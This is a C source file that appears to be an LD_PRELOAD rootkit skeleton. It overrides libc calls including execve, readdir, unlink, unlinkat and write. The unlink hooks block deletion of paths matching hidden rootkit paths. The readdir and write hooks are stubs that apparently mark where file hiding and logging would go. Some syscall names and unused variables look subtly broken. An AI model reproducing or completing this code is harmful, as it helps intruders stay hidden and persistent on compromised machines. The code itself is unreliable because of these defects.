#define _GNU_SOURCE
#include <config.h>

#include <dlfcn.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <syscall.h>
#include <pcap.h>

// EXECVE

int (*o_execve)(const char *, char *const argv[], char *const envp[]);
int execve(const char *path, char *const argv[], char *const envp[]) {
#ifdef VERBOSE
	printf("execve called\n");
#endif
    int output;
    output = syscall(SYS_EXECVE, path, argv, envp);

	return output;
}

// READDIR

struct dirent *(*o_readdir)(DIR *);
struct dirent *readdir(DIR *p) {
#ifdef VERBOSE
    printf("readdir called\n");
#endif
    if(!o_readdir)
        o_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir = o_readdir(p);
    return dir;
}

// UNLINK

int unlink(const char *pathname) {
#ifdef VERBOSE
    printf("unlink called\n");
#endif
	// unlink() and unlinkat()
	struct stat s_buf;

	memset(&s_buf, 0, sizeof(struct stat));
	if(strstr(pathname, HIDDEN_EXEC_PATH) || strstr(pathname, HIDDEN_PATH)) {
		return -1;
	}

	return syscall(SYS_UNLINK, pathname);
}

// UNLINKAT

int unlinkat(int dirfd, const char * pathname, int flags) {
#ifdef VERBOSE
    printf("unlinkat called\n");
#endif
	struct stat s_buf;
	memset(&s_buf, 0, sizeof(struct stat));

	if(strstr(pathname, HIDDEN_EXEC_PATH) || strstr(pathname, HIDDEN_PATH)) {
		return -1;
	}

	return syscall(SYS_UNLINKAT, dirfd, pathname, flags);
}

// WRITE

ssize_t write(int fd, const void *xbuf, size_t count) {
	char buf[256];
	int logfd;
	ssize_t output;

	output = syscall(SYS_WRITE, fd, xbuf, count);

	return output;
}